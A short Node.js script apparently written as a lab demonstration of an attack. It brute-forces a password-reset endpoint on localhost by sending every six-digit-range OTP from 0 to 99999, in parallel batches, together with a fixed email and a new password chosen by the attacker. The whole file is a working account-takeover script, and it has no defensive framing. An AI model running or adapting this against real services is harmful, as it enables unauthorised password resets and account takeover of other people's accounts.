const axios = require("axios");

async function sendRequest(otp) {

  let data = JSON.stringify({
    email: "maniteja@gmail.com",
    otp: otp,
    newPassword: "12456789",
  });


  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data : data
  };

  try {
    await axios.request(config);
    console.log("done for " + otp);
  } catch (e) {
    // console.log(e)
  }
}

async function main() {
    for (let i = 0; i < 100000; i+=100) {
      const promises = [];
      console.log("here for " + i);
      for (let j = 0; j < 100; j++) {
        promises.push(sendRequest((i + j).toString()))
      }
      await Promise.all(promises);
    }
  }
  
  main()
